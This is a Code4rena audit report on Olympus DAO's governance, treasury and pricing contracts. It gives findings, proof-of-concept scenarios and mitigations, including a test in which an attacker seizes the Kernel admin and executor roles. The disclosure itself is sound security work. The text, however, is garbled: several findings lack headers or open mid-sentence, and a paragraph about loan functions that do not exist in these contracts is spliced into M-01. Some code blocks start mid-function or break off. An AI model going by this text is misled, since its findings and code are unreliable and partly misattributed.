# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit contest outlined in this document, C4 conducted an analysis of the Olympus DAO smart contract system written in Solidity. The audit contest took place between August 25â€”September 1 2022.

Additionally, C4 analysis included 114 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 91 reports recommending gas optimizations.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 Olympus DAO contest repository](https://github.com/code-423n4/2022-08-olympus), and is composed of 18 smart contracts written in the Solidity programming language and includes 1,944 lines of Solidity code.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities according to a methodology based on [OWASP standards](https://owasp.org/www-community/OWASP_Risk_Rating_Methodology).

Vulnerabilities are divided into three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

## [[H-01] In `Governance.sol`, it might be impossible to activate a new proposal forever after failed to execute the previous active proposal.](https://github.com/code-423n4/2022-08-olympus-findings/issues/376)
_Submitted by hansfriese, also found by berndartmueller, csanuragjain, m9800, V&#95;B, and zzzitron_

<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L216-L221><br>
<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L302-L304>

Currently, if users vote for the active proposal, the `VOTES` are transferred to the contract so that users can't vote or endorse other proposals while the voted proposal is active.

And the active proposal can be replaced only when the proposal is executed successfully or another proposal is activated after `GRACE_PERIOD`.

But `activateProposal()` requires at least 20% endorsements [here](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L216-L221), so it might be impossible to activate a new proposal forever if the current active proposal involves more than 80% of total votes.

### Proof of Concept

The below scenario would be possible.

1.  `Proposal 1` was submitted and activated successfully.
2.  Let's assume 81% of the total votes voted for this proposal. `Yes = 47%`, `No = 34%`
3.  This proposal can't be executed for [this requirement](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L268-L270) because `47% - 34% = 13% < 33%`.
4.  Currently the contract contains more than 81% of total votes and users have at most 19% in total.
5.  Also users can't reclaim their votes among 81% while `Proposal 1` is active.
6.  So even if a user who has 1% votes submits a new proposal, it's impossible to activate because of this [require()](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L216-L221).
7.  So it's impossible to delete `Proposal 1` from an active proposal and there won't be other active proposal forever.

### Tools Used

Solidity Visual Developer of VSCode

### Recommended Mitigation Steps

I think we should add one more constant like `EXECUTION_EXPIRE = 2 weeks` so that voters can reclaim their votes after this period even if the proposal is active.

I am not sure we can use the current `GRACE_PERIOD` for that purpose.

So `reclaimVotes()` should be modified like below.

    function reclaimVotes(uint256 proposalId_) external {
        uint256 userVotes = userVotesForProposal[proposalId_][msg.sender];

        if (userVotes == 0) {
            revert CannotReclaimZeroVotes();
        }

        if (proposalId_ == activeProposal.proposalId) {
            if (block.timestamp < activeProposal.activationTimestamp + EXECUTION_EXPIRE) //+++++++++++++++++++++++++++++++++
            {
                revert CannotReclaimTokensForActiveVote();
            }
        }

        if (tokenClaimsForProposal[proposalId_][msg.sender] == true) {
            revert VotingTokensAlreadyReclaimed();
        }

        tokenClaimsForProposal[proposalId_][msg.sender] = true;

        VOTES.transferFrom(address(this), msg.sender, userVotes);
    }

## [[H-02] Anyone can pass any proposal alone before first `VOTES` are minted](https://github.com/code-423n4/2022-08-olympus-findings/issues/392)
_Submitted by Bahurum, also found by bin2chen and cryptphi_

<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L164><br>
<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L217-L218><br>
<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L268>

Before any `VOTES` are minted anyone can activate and execute an arbitrary proposal even with 0 votes cast. So an attacker can pass any proposal (i.e. change the `executor` + `admin` of the `Kernel`, gaining access to all permissioned functions and to funds held).

### Proof of Concept

Checks on vote numbers made in `Governance.sol` at lines [L164](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L164), [217-218](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L217-218), [268](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L268) pass if `VOTES.totalSupply() == 0`. So, until no `VOTES` are minted, anyone can submit, activate and execute a proposal. There is no need to own or cast votes. This happens if `OlympusGovernance` is granted the `executor` role before any `VOTES` are minted (as in [Governance.t.sol](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/test/policies/Governance.t.sol)). The attacker can anticipate/frontrun the minting and pass a proposal to change both the `Kernel` `admin` and `executor`. Then he/she can upgrade malicious modules, steal funds from treasury...

A PoC was obtained modifying the `setUp()` of [Governance.t.sol](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/test/policies/Governance.t.sol) by keeping only what is before the minting of `VOTES` (up to [L83](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/test/policies/Governance.t.sol#L83) included). The test is as follows:

```solidity
    function test_AttackerPassesProposalBeforeMinting() public {

        address[] memory users = userCreator.create(1);
        address attacker = users[0];
        vm.prank(attacker);
        MockMalicious attackerControlledContract = new MockMalicious();

        Instruction[] memory instructions_ = new Instruction[](2);
        instructions_[0] = Instruction(Actions.ChangeAdmin, address(attackerControlledContract));
        instructions_[1] = Instruction(Actions.ChangeExecutor, address(attackerControlledContract));

        vm.prank(attacker);
        governance.submitProposal(instructions_, "proposalName", "This is the proposal URI");
        
        governance.endorseProposal(1);
        
        vm.prank(attacker);
        governance.activateProposal(1);
        
        vm.warp(block.timestamp + 3 days + 1);
        
        governance.executeProposal();

        assert(kernel.executor()==address(attackerControlledContract));
        assert(kernel.admin()==address(attackerControlledContract));


    }
```

with

```solidity
contract MockMalicious {}

```

### Recommended Mitigation Steps

In `Governance.sol` check for a minimum VOTES totalSupply, similiar to the expected initial supply of VOTES when they have been fairly distributed, for example at line [L164](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L164).

## [[H-03] TRSRY: front-runnable `setApprovalFor`](https://github.com/code-423n4/2022-08-olympus-findings/issues/410)
_Submitted by zzzitron, also found by berndartmueller, csanuragjain, pashov, Ruhum, sorrynotsorry, and Trust_

<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L64-L72><br>
<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/TreasuryCustodian.sol#L42-L48>

An attacker may be able to withdraw more than intended

### Proof of Concept

Let's say Alice had approval of 100. Now the treasury custodian reduced the approval to 50. Alice could frontrun the `setApprovalFor` of 50, and withdraw 100 as it was before. Then withdraw 50 with the newly set approval. So the alice could withdraw 150.

```solidity
// modules/TRSRY.sol

 63     /// @notice Sets approval for specific withdrawer addresses
 64     function setApprovalFor(
 65         address withdrawer_,
 66         ERC20 token_,
 67         uint256 amount_
 68     ) external permissioned {
 69         withdrawApproval[withdrawer_][token_] = amount_;
 70
 71         emit ApprovedForWithdrawal(withdrawer_, token_, amount_);
 72     }
```

The `TreasuryCustodian` simply calls the `setApprovalFor` to grant Approval.

```solidity
 41
 42     function grantApproval(
 43         address for_,
 44         ERC20 token_,
 45         uint256 amount_
 46     ) external onlyRole("custodian") {
 47         TRSRY.setApprovalFor(for_, token_, amount_);
 48     }
```

### Recommended Mitigation Steps

Instead of setting the given amount, one can reduce from the current approval. By doing so, it checks whether the previous approval is spend.

 > I did, I just thought it was unnecessary to evaluate the issue. I was just saying that the context of the code is that it is not intended to be used to approve an EOA/multisig, but instead used to approve governance-voted contracts to access treasury funds, in order to deposit into yield contracts or whatever. But I don't think it's very relevant to this, as the code is still faulty and exploitable in an extreme case. I already have made this remediation as well, so all good.

## [[M-01] `Operator::setReserveFactor` doesn't check if bond market should be changed](https://github.com/code-423n4/2022-08-olympus-findings/issues/83)
_Submitted by rvierdiiev_

`Operator::setReserveFactor` sets new `reserveFactor` value. This parameter is used in `fullCapacity` function to calculate how much capacity is available by high/low side. Then calculated capacity is used by `Range` module inside `regenerate` function to set the threshold of capacity for both sides of market. Then in `Range::updateCapacity` function this threshold is checked to understand if the wall should be down and the bond market should be closed.

Changing this value means that the capacity of sides has changed and the sides should be regenarated to include this changes.

 > After discussing with the team more, we are going to leave this as-is. It is more flexible to not regenerate the side in this function. With the current implementation, the guardian can determine if the change should go into effect on the next regen, or if it should happen immediately. To enable immediately, they can manually call `regenerate`.

In `getloan()` and `replayloan()`, the `safetransfer` and `safetransferfrom` doesn't check the existence of code at the token address. This is a known issue while using solmate's libraries.<br>
Hence this may lead to miscalculation of funds and may lead to loss of funds , because if `safetransfer()` and `safetransferfrom()` are called on a token address that doesn't have contract in it, it will always return success, bypassing the return value check. Due to this protocol will think that funds has been transferred and successful , and records will be accordingly calculated, but in reality funds were never transferred.<br>
So this will lead to miscalculation and possibly loss of funds

Loss of treasury funds.

### Proof of Concept

<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L133-L139>

    if (capacity_ < _range.high.threshold && _range.high.active) {
        // Set wall to inactive
        _range.high.active = false;
        _range.high.lastActive = uint48(block.timestamp);


        emit WallDown(true, block.timestamp, capacity_);
    }

\_range.high.lastActive and \_range.low\.lastActive are only updated in RANGE.sol when \_range.x.capacity < \_range.x.threshold and the \_range.x.active == true. After this is tripped, \_range.x.active will be set to false, meaning that \_range.x.lastActive will not be updated again until the wall is regenerated and capacity is restored.

<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L209-L214>

        if (
            uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait) &&
            _status.high.count >= config_.regenThreshold
        ) {
            _regenerate(true);
        }

If 1) the price were to sustain outside of the range (high volatility for volatile asset, black swan for stable) for longer than config\_.regenWait and 2) config_regenThreshold satisfies the following equation:

    config_.regenThreshold <= _config.regenObserve - config_.regenWait / frequency

then *status.high.count could be greater than config*.regenThreshold. This would trigger more funds to be deployed even though the price never came back inside the wall price.

In this scenario the wall price would be far from the true price of the asset leading to loss of treasury funds as it buys/sell at prices well above/below market price.

### Recommended Mitigation Steps

A check should be added to verify that the price is within the wall price before regenerating. Alternatively, config\_.regenTheshold could be set to satisfy the following equation:

    config_.regenThreshold > _config.regenObserve - config_.regenWait / frequency

This would eliminate the risk as \_status.high.count >= config\_.regenThreshold could never be true for a sustained period where current price is greater than the wall price.

## [[M-04] `OlympusGovernance#executeProposal`: reentrancy attack vulnerable function](https://github.com/code-423n4/2022-08-olympus-findings/issues/132)
_Submitted by carlitox477, also found by cryptphi and ladboy233_

<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L265><br>

Given that the activeProposal change is done before the for loop, if this function is call through one `kernel.executeAction(instruction,target)` we can call the same instructions (in the same order) again and again, which may or may not affect funds (depending on the instructions).

### Proof of Concept

For instance, if we install a new module, and this module has a vulnerability (even intentional), the next steps can by trigger:

1.  Call executeAction
2.  This allow us to call kernel.executeAction in the for loop
3.  executAction allow us to call **\_installModule**
4.  **\_installModule** allow us to call **newModule\_.Init**
5.  By init we can call now executeProposal again (suppose that the init function interact with a previous vulnerable proxy contract to scam voters to vote in favour of this proposal as if it was a contract which is ok, and before calling executeProposal we change the implementation to allow this attack),

### Recommended Mitigation Steps

Use nonReentrant modifier or move the line `activeProposal = ActivatedProposal(0, 0);` before the for loop.

## [[M-05] Proposals overwrite](https://github.com/code-423n4/2022-08-olympus-findings/issues/201)
_Submitted by 0x1f8b_

<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L167><br>

It is possible to overwrite proposals in certain circumstances. The method `Governance.submitProposal` doesn't check if the `proposalId` (stored in a different contract) exists already as a valid proposal in `getProposalMetadata`.

### Proof of Concept

If the project update the kernel module "`INSTR`" and reconfigure proposals and call `INSTR.store(instructions_);`, the counter may return a `proposalId` of an existing proposal and overwrite an existing previous one.

This is due to the fact that the proposals are saved in a mapping of a contract that is not related to the one that returns the counters, and furthermore, they do not check that the record already exists.

```javascript
        uint256 proposalId = INSTR.store(instructions_);
        getProposalMetadata[proposalId] = ProposalMetadata(
            title_,
            msg.sender,
            block.timestamp,
            proposalURI_
        );
```

### Recommended Mitigation Steps

*   Store the proposal metadata in the same `INSTR` contract or ensure that the proposal doesn't exist.

The following comment indicates that the `OlympusVotes` contract is a stub for `gOHM`. Checking the `gOHM` contract at <https://etherscan.io/token/0x0ab87046fBb341D058F17CBC4c1133F25a20a52f#code>, the `transfer` and `transferFrom` functions are available.

<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L9-L11>

```solidity
/// @notice Votes module is the ERC20 token that represents voting power in the network.
/// @dev    This is currently a substitute module that stubs gOHM.
contract OlympusVotes is Module, ERC20 {
```

Moreover, the [documentation](https://hackmd.io/iWgqYLFwShGUDBF4zh397w#3-Vote-Redemption) states that the vote redemption mechanism "exists to deter malicious behavior by ensuring users cannot transfer their voting tokens until after the proposal has been resolved", which also indicates that the voting tokens are meant to be transferrable between users.

When the voting tokens are transferrable, one user can first use her or his votes to call the following `endorseProposal` function to endorse a proposal and then transfer these votes to another user. The other user can use these votes to endorse the same proposal again afterwards. Because of the double-endorsement, the `(totalEndorsementsForProposal[proposalId_] * 100) < VOTES.totalSupply() * ENDORSEMENT_THRESHOLD` condition can become true so the proposal can be activated by calling the `activateProposal` function below. However, the proposal should only be endorsed with these same votes once and should not be able to be activated if it could not satisify `(totalEndorsementsForProposal[proposalId_] * 100) < VOTES.totalSupply() * ENDORSEMENT_THRESHOLD` with these votes being used once.

        assertEq(governance.userEndorsementsForProposal(1, voter2), 200);
        assertEq(governance.totalEndorsementsForProposal(1), 400);

        // At this moment, the proposal can be activated successfully.
        // However, if it is endorsed with only 200 votes, it cannot satisfy ENDORSEMENT_THRESHOLD and cannot be activated.

        vm.prank(voter1);
        governance.activateProposal(1);
    }
```

### Tools Used

VSCode

### Recommended Mitigation Steps

When calling `endorseProposal`, the user's votes can be locked by transferring these votes to the governance so the user cannot transfer these anymore to another user after the endorsement. An additional function can be added for reclaiming the endorsed votes back to the user and reducing the proposal's endorsed votes accordingly before the proposal is activated. After the proposal is activated, the endorsed votes should be counted as the voted votes.

## [[M-07] Endorsed votes by a user do not decrease after the user's votes are revoked](https://github.com/code-423n4/2022-08-olympus-findings/issues/257)
_Submitted by rbserver_

<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L53-L56><br>
<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L180-L201>

The voter admin can call the following `revokeVotesFrom` function to revoke a user's votes, which also decreases the total supply of the votes, after the user endorses a proposal through calling the `endorseProposal` function below. Because `endorseProposal` can be called multiple times, the user has the incentive to call it for endorsing the proposal again with the new votes minted by the [`issueVotesTo`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L45-L48) function. However, after the user's votes are revoked, the user has no incentive to call `endorseProposal` again. Hence, the endorsed votes by the user for the proposal does not decrease after the user's votes are revoked. When determining whether the proposal can be activated or not, its old endorsed votes, which is not decreased, are compared against the new total supply of the votes, which is decreased because of the `revokeVotesFrom` call. As a result, the proposal is unreliably more likely to satisfy the condition for being activated.

### Tools Used

### Recommended Mitigation Steps

When `revokeVotesFrom` is called during the time for endorsement, the corresponding votes that are previously endorsed for a proposal and are now revoked should be removed from the proposal's endorsed votes for the user. This ensures that the endorsed votes and the votes' total supply after the revocation are in sync for the proposal.

## [[M-08] "TWAP" used is an observation-weighted-average-price, not a time-weighted one](https://github.com/code-423n4/2022-08-olympus-findings/issues/267)
_Submitted by IllIllI_

While users are incentivized to call the heartbeat, the incentive may be removed later, or it may be more profitable to use old prices, so users may not call the heartbeat during unfavorable prices, leading to the TWAP price being incorrect, and users getting the wrong price for their assets.

A similar case of an incomplete TWAP algorithm was found to be of [Medium](https://github.com/code-423n4/2022-06-nibbl-findings/issues/191) risk.

### Proof of Concept

A TWAP is a Time-Weighted average price, but the algorithm below does not take into account the time between observations:

```solidity
File: /src/modules/PRICE.sol   #1

134          // Calculate new moving average
135          if (currentPrice > earliestPrice) {
136              _movingAverage += (currentPrice - earliestPrice) / numObs;
137          } else {
138              _movingAverage -= (earliestPrice - currentPrice) / numObs;
139          }
140  
141          // Push new observation into storage and store timestamp taken at
142          observations[nextObsIndex] = currentPrice;
143          lastObservationTime = uint48(block.timestamp);
144:         nextObsIndex = (nextObsIndex + 1) % numObs;
```

<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L134-L144>

While the `Heart` policy enforces an upper bound on how frequently updates are added to the average, there is no guarantee that users call `beat()` in a timely manner:

```solidity
File: /src/policies/Heart.sol   #2

92       function beat() external nonReentrant {
93           if (!active) revert Heart_BeatStopped();
94:          if (block.timestamp < lastBeat + frequency()) revert Heart_OutOfCycle();
```

<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L92-L94>

The incentive may be set to too low an amount:

```solidity
File: /src/policies/Heart.sol   #3

140      function setRewardTokenAndAmount(ERC20 token_, uint256 reward_)
141          external
142          onlyRole("heart_admin")
143      {
144          rewardToken = token_;
145          reward = reward_;
146          emit RewardUpdated(token_, reward_);
147:     }
```

<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L140-L147>

Or users may find it more profitable to skip a particular update, or front-run an unfavorable update, with a transaction that trades assets at the old price

### Recommended Mitigation Steps

Always call an internal version of `beat()` that doesn't revert, in functions that swap user assets. The code should also track the timestamps of when each `beat()` is called, and include the amount of time that has passed since the last beat, in the TWAP calculation

 > The referenced issue is a bit different than our use case since we will be using a much longer duration moving average. The goal is to get an approximate moving average over a certain period of time (e.g. 120 days) vs. an exact number since, as you say, the time of each observation cannot be guaranteed to be at a specific time. We believe that using a long duration with a sufficient number of observations will make this value close enough to the true value it is approximating, and prevents actors from manipulating the value by waiting to provide a specific value (1 out of ~360 obs doesn't move the needle). The use of the "TWAP" term may be semantically inaccurate.

Therefore, the call could fail due to the slippage check. This could be confusing behavior and may have unintended consequences of DOS'ing the system. Additionally, the gas cost of `beat` is highly variable (sometimes up to 600k gas when opening a bond market) and would cause some users to unexpectedly pay a lot more gas for a swap.

## [[M-09] `activateProposal()` need time delay](https://github.com/code-423n4/2022-08-olympus-findings/issues/273)
_Submitted by &#95;&#95;141345&#95;&#95;, also found by 0x1f8b, Trust, V&#95;B, and zzzitron_

<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L205-L262><br>

There is no time lock or delay when activating a proposal, the previous one could be replaced immediately. In `vote()` call, a user might want to vote for the previous proposal, but if the `vote()` call and the `activateProposal()` is very close or even in the same block, it is quite possible that the user actually voted for another proposal without much knowledge of. A worse case is some malicious user watching the mempool, and front run a big vote favor/against the `activeProposal`, effectively influence the voting result.

These situations are not what the governance intends to deliver, and might also affect the results of 2 proposals.

### Proof of Concept

`activateProposal()` can take effect right away, replacing the `activeProposal`. And `vote()` does not specify which `proposalId` to vote for, but the `activeProposal` could be different from last second.

src/policies/Governance.sol

```solidity
    function activateProposal(uint256 proposalId_) external {
        ProposalMetadata memory proposal = getProposalMetadata[proposalId_];

        if (msg.sender != proposal.submitter) {
            revert NotAuthorizedToActivateProposal();
        }

        if (block.timestamp > proposal.submissionTimestamp + ACTIVATION_DEADLINE) {
            revert SubmittedProposalHasExpired();
        }

        if (
            (totalEndorsementsForProposal[proposalId_] * 100) <
            VOTES.totalSupply() * ENDORSEMENT_THRESHOLD
        ) {
            revert NotEnoughEndorsementsToActivateProposal();
        }

        if (proposalHasBeenActivated[proposalId_] == true) {
            revert ProposalAlreadyActivated();
        }

        if (block.timestamp < activeProposal.activationTimestamp + GRACE_PERIOD) {
            revert ActiveProposalNotExpired();
        }

        activeProposal = ActivatedProposal(proposalId_, block.timestamp);

        proposalHasBeenActivated[proposalId_] = true;

        emit ProposalActivated(proposalId_, block.timestamp);
    }

    function vote(bool for_) external {
        uint256 userVotes = VOTES.balanceOf(msg.sender);

        if (activeProposal.proposalId == 0) {
            revert NoActiveProposalDetected();
        }

        if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {
            revert UserAlreadyVoted();
        }

        if (for_) {
            yesVotesForProposal[activeProposal.proposalId] += userVotes;
        } else {
            noVotesForProposal[activeProposal.proposalId] += userVotes;
        }

        userVotesForProposal[activeProposal.proposalId][msg.sender] = userVotes;

        VOTES.transferFrom(msg.sender, address(this), userVotes);

        emit WalletVoted(activeProposal.proposalId, msg.sender, for_, userVotes);
    }

```

### Recommended Mitigation Steps

Add time delay when activating a proposal, so that users can be aware of that and vote for the current one within the time window.

<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L53-L56><br>

A user can call the following `vote` function to vote for a proposal. During voting, the voter admin can still call the `issueVotesTo` and `revokeVotesFrom` functions below to issue new votes or revoke old votes for the user, which also changes the votes' total supply during the overall voting. Because each user can only call `vote` once for a proposal due to the `userVotesForProposal[activeProposal.proposalId][msg.sender] > 0` conditional check, the old voted votes, resulted from the `vote` call by the user, will be used to compare against the new total supply of the votes, resulted from the `issueVotesTo` and `revokeVotesFrom` calls during the overall voting, when determining whether the proposal can be executed or not. Because of this inconsistency, the result on whether the proposal can be executed might not be reliable.

Then, please append the following tests. These tests will pass to demonstrate the described scenarios.

        // to simulate calling VoterRegistration.issueVotesTo that mints votes to voter3, VOTES.mintTo is called by godmode here
        vm.prank(godmode);
        VOTES.mintTo(voter3, 500);
        assertEq(VOTES.balanceOf(voter3), 500);

        // calling vote function again by voter3 reverts, which means that voter3 cannot additionally vote with the 500 newly minted votes
        vm.expectRevert(UserAlreadyVoted.selector);

        assertEq(VOTES.balanceOf(voter3), 0);
        assertEq(VOTES.balanceOf(address(governance)), 300);
    }
```

### Tools Used

VSCode

### Recommended Mitigation Steps

When `issueVotesTo` and `revokeVotesFrom` are called during voting, the corresponding votes need to be added to or removed from the proposal's voted votes for the user. Alternatively, `issueVotesTo` and `revokeVotesFrom` can be disabled when an active proposal exists.

## [[M-11] OlympusGovernance: Users can prevent their votes from being revoked](https://github.com/code-423n4/2022-08-olympus-findings/issues/308)
_Submitted by cccz, also found by zzzitron_

In the VoterRegistration contract, voter_admin can call the revokeVotesFrom function to revoke the user's votes.

        function revokeVotesFrom(address wallet_, uint256 amount_) external onlyRole("voter_admin") {
            // Revoke the votes in the VOTES module
            VOTES.burnFrom(wallet_, amount_);
        }

But there is a way for users to prevent their votes from being revoked by voter_admin.<br>
In the OlympusGovernance contract, the user can call the vote function to vote for the activeProposal, and then call the reclaimVotes function to reclaim his votes.<br>
When the vote function is called, VOTES are sent to the OlympusGovernance contract and recorded using the userVotesForProposal variable. When the reclaimVotes function is called, the VOTES recorded in the userVotesForProposal variable are sent back to the user.<br>
This means that the user can **store** his VOTES tokens in userVotesForProposal.<br>
The revokeVotesFrom function cannot revoke the VOTES tokens recorded in userVotesForProposal and the reclaimVotes function can only be called by the user himself.<br>
If the user calls the reclaimVotes function and vote function in one transaction, then his VOTES token balance will always be 0 (thus avoiding revocation of votes by voter_admin) and he will be able to vote.

### Proof of Concept

### Recommended Mitigation Steps

Consider allowing to call the reclaimVotes function to reclaim any user's vote, thus avoiding the user storing his VOTES tokens in userVotesForProposal

        function reclaimVotes(uint256 proposalId_, address user_) external {
            uint256 userVotes = userVotesForProposal[proposalId_][user_];

            if (userVotes == 0) {
                revert CannotReclaimZeroVotes();
            }

            if (proposalId_ == activeProposal.proposalId) {
                revert CannotReclaimTokensForActiveVote();
            }

            if (tokenClaimsForProposal[proposalId_][user_] == true) {
                revert VotingTokensAlreadyReclaimed();
            }

            tokenClaimsForProposal[proposalId_][user_] = true;

## [[M-12] Griefing/DOS of withdrawals by EOAs from treasury (TRSRY) possible](https://github.com/code-423n4/2022-08-olympus-findings/issues/317)
_Submitted by minhtrng_

<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/TreasuryCustodian.sol#L53-L67><br>

Any withdrawals from the treasury by an approved EOA can be denied by a malicious actor that watches the mempool.

### Proof of Concept

The function TreasuryCustodian.revokePolicyApprovals() doesnt provide sufficient checks for its intended purpose of "revoking a deactivated policy's approvals". As can be seen by the TODO labels, the issue has already been acknowledged by the team (regardless it is still an issue present in an in-scope contract). The only check performed is trying to call the isActive()-function on an address and interpret the returned value as boolean. Attempting to call this function on an EOA will not fail and return 0 (=false). Hence the condition to revert is not fulfilled and the amounts approved to withdraw will be set to 0.

### Tools Used

IDE (Remix, VSCode)

### Recommended Mitigation Steps

A partial but insufficient fix would be to check if the address passed to the function contains code and hence is not an EOA. A better approach might be to add a mapping(address => bool) of all addresses that have been active policies some time in the past to the kernel, something like this:

As a public variable in Kernel.sol
`mapping(address => bool) public isRegisteredPolicy;`

in Kernel.activatePolicy():
`isRegisteredPolicy[address(policy_)] ) = true;`

and finally in TreasuryCustodian.revokePolicyApprovals():
`if(!kernel.isRegisteredPolicy(policy_) revert NotARegisteredPolicy`

 > TODOs are outdated, I forgot to clear them ;(. But the points are taken. Code will be adjusted, but probably not the way from the recommendation. Instead will gate the function behind custodian role.

## [[M-13] Missing checks in `Kernel._deactivatePolicy`](https://github.com/code-423n4/2022-08-olympus-findings/issues/368)
_Submitted by enckrish_

There are no checks to ascertain that the policy being removed is registered in the `Kernel`. Trying to remove a non-registered results in the policy registered at 0th index of `activePolicies` being removed.

### Proof of Concept

<https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L325>

### Recommended Mitigation Steps

Adding `require(activePolicies[idx] == policy_, "Unregistered policy");` will prevent this, where `idx = getPolicyIndex[policy_]`.

**NOTE:** The issue is less likely to happen as this is handled solely by the executor, but having safeguards in the contract is always better than relying on an external factor.

When this time period is over, this procedure may be repeated, either immediately or just before any other proposal activation by front-running.

### Recommended Mitigation Steps

Making sure `ENDORSEMENT_THRESHOLD` is at least 50% seems discouraging enough. Other more creative solutions should be possible. One might be to let the most endorsed proposal be activated, or restricting who can activate a proposal; anything that at least temporarily liberates the governance system so that the attacker is dissuaded from investing in this attack method.

## [[M-15] Heart will stop if all rewards are swept](https://github.com/code-423n4/2022-08-olympus-findings/issues/378)
_Submitted by GalloDaSballo, also found by cccz, itsmeSTYJ, and PwnPatrol_

Rewards for Heart `beat` are sent via `_issueReward`

<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L110-L115>

```solidity

    function _issueReward(address to_) internal {
        rewardToken.safeTransfer(to_, reward);
        emit RewardIssued(to_, reward);
    }

```

The function doesn't check for available tokens e.g.<br>
`min(reward, rewardToken.balanceOf(address(this)));`

In case of calling `withdrawUnspentRewards`

<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L149-L152>

```solidity
    /// @inheritdoc IHeart
    function withdrawUnspentRewards(ERC20 token_) external onlyRole("heart_admin") {
        token_.safeTransfer(msg.sender, token_.balanceOf(address(this)));
    }
```

Because the function withdraws the entire amount, the heart will stop until a caller incentive is deposited again.

While a profitable searches will stop calling the Heart without an incentive, allowing the heart to beat when no rewards are available is preferable to having it self-DOS until a DAO aligned caller donates `rewardToken` or the DAO deals with the lack of tokens.

### Recommended Mitigation Steps

Add a check for available tokens
`min(reward, rewardToken.balanceOf(address(this)));`

_Submitted by hansfriese, also found by datapunk and itsmeSTYJ_

Inconsistant parameter requirements between `constructor` and `Set() functions` in `RANGE.sol` and `Operator.sol`.

The contracts might work unexpectedly when the params are set improperly using `constructor()`.

### Proof of Concept

*   In `RANGE.sol`, [setSpreads()](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L244-L250) and [setThresholdFactor()](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L264) has some requirements but [constructor()](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L80) doesn't check at all.

## [[M-17] No Cap on Amount of VOTES means the `voter_admin` can get any proposal to pass](https://github.com/code-423n4/2022-08-olympus-findings/issues/380)
_Submitted by GalloDaSballo, also found by 0xNazgul, IllIllI, and rbserver_

